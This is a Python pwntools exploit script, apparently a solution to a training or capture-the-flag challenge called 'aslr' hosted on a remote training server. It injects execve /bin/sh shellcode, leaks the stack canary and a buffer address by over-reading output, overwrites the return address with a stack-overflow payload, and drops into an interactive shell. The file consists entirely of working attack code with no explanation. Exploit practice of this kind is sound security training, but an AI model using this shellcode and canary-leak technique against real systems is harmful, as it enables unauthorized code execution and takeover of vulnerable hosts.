from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

#r = process("./aslr")
r = remote("training.jinblack.it", 2012)
#gdb.attach(r, """b main
#""")

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"

shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

shellcode = shellcode.ljust(100, b"\x90")

r.send(shellcode)

time.sleep(0.2)

r.send(b"\x41" * 105)

time.sleep(0.1)

print(r.recvuntil("> "))

r.recv(105)

canary = u64(b"\x00" + r.recv(7))

print("0x%x" % canary)

r.send(b"A" * 152)
print(r.recvuntil("> "))
time.sleep(0.2)

r.recv(152)

buffer_address = r.recv(6) + b"\x00\x00"
buffer_address = u64(buffer_address) + 0x200720

print("0x%x" % buffer_address)

payload = b"A" * 104 + p64(canary) + b"B"*8 + p64(buffer_address)

r.send(payload)
time.sleep(0.1)

r.interactive()
